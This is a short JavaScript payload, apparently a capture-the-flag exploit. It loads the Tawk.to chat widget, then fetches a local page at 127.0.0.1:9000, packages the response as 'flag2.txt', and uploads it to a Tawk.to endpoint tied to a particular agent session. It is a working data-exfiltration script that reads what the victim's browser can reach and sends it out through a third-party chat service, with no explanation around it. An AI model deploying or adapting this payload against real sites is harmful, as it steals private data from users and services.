var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/61830caa6bb0760a494106d7/1fjjuiusl';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);

})();

fetch("http://127.0.0.1:9000/view/46b5d1b0-8a08-4e75-818a-4003a7d61a5c").then((res) => {
    return res.text();
  }).then(data => {
			var formData = new FormData();
			var file = new File([data], "flag2.txt", {
			type: "text/plain",
		});

    formData.append("upload", file);

    fetch("https://upload.tawk.to/upload/page/agent?handle=a675aee4143d8173624ca403828cbb9793891f10&pageId=61830caa6bb0760a494106d7&agentSessionId=6185ddfe69d9e20b02ec5920",{
        method: 'POST',
        body: formData
    });

})
